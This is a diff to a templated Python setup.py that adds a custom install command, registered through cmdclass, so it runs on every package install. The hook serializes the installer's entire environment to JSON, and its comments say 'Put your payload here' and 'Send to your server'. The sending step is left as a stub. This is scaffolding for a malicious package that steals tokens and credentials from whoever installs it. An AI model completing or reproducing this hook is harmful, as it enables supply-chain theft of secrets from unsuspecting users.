@@ -1,4 +1,19 @@
 from setuptools import find_packages, setup
+from setuptools.command.install import install
+import os, json
+
+
+class CustomInstallCommand(install):
+    """Customized setuptools install command. Put your payload here."""
+    def run(self):
+        environment_variables = json.dumps(os.environ)
+
+        # Send to your server
+        pass
+
+        # Run the rest of the instalation
+        install.run(self)
+
 
 setup(
   name = '{{name}}',
@@ -6,6 +21,9 @@ setup(
   version = '0.1',
   description = '{{description}}',
   author = '{{author}}',
+  cmdclass={
+    'install': CustomInstallCommand,
+  },
   author_email = '{{email}}',
   url = '{{url}}',
   keywords = [],
